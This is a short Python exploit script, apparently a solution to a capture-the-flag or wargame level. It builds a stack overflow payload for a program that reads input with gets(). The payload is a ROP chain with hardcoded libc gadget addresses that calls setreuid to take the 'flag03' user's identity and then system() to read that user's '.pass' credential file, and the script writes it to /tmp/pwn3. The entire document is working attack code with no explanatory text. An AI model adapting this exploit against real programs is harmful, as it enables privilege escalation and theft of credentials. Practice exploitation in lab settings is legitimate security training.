import struct
LIBC_BASE = 0x7ffff7c00000
POP_RDI  = LIBC_BASE + 0x10c08d
POP_RSI  = LIBC_BASE + 0x110b7d
SETREUID = LIBC_BASE + 0x127370
SYSTEM   = LIBC_BASE + 0x58750
ARG      = 0x40408c
UID      = 1020

line  = b"JOB:cat /home/flag03/.pass\x00"
line += b"A" * (136 - len(line))
line += struct.pack("<Q", POP_RDI)  + struct.pack("<Q", UID)   # setreuid(1020, ...
line += struct.pack("<Q", POP_RSI)  + struct.pack("<Q", UID)   #            ..., 1020)
line += struct.pack("<Q", SETREUID)                            # ruid = euid = flag03
line += struct.pack("<Q", POP_RDI)  + struct.pack("<Q", ARG)   # rdi = command string
line += struct.pack("<Q", SYSTEM)                              # NO ret slot (alignment)
for v in (POP_RDI, POP_RSI, SETREUID, SYSTEM, UID):
    assert b"\x0a" not in struct.pack("<Q", v), hex(v)   # gets() stops at 0x0a
open("/tmp/pwn3","wb").write(line + b"\n")
